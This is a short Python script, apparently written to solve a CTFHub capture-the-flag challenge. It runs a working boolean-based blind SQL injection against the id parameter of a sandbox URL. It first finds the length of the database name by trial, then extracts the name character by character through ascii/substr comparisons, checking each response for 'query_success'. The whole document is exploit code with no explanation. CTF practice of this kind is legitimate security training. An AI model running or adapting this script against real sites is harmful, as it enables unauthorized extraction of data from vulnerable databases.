import requests

url = "http://challenge-970fe9452a2a4626.sandbox.ctfhub.com:10800/?id=1 "
# 数据库名称长度
i = 0
while 1:
	url1 = url + 'and length(database())={}'.format(i)
	re = requests.get(url1)
	if 'query_success'  in str(re.content):
		break
	i = i + 1
	print(i)
lenDb = i
print(lenDb)
# 数据库名称
database = ''
for i in range(lenDb):
	for asc in range(65,123):
		url1 = url + 'and ascii(substr(database(),'+str(i+1)+',1))='+str(asc)+' --+'
		re = requests.get(url1)
		print(asc)
		if 'query_success' in str(re.content):
			database = database + chr(asc)
			print(chr(asc))
			break
print(database)
